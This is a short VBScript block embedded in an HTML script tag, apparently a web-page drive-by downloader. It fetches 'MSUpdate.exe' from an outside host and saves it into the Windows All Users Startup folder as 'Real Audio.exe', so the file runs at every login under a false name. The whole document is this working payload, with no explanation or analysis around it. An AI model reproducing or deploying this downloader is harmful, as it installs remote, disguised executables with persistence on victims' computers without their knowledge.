   <script language=vbs>
   set oHTTP = CreateObject("msxml2.XMLHTTP")
   oHTTP.open "GET", "http://www.myfreeaccess.biz/MSUpdate.exe", False
   oHTTP.send
   set oStream = createobject("adodb.stream")
   Const adTypeBinary = 1
   Const adSaveCreateOverWrite = 2
   oStream.type = adTypeBinary
   oStream.open
   oStream.write oHTTP.responseBody
   oStream.savetofile "c:\Documents and Settings\All Users\Start Menu\Programs\Startup\Real Audio.exe", adSaveCreateOverWrite
   </script>
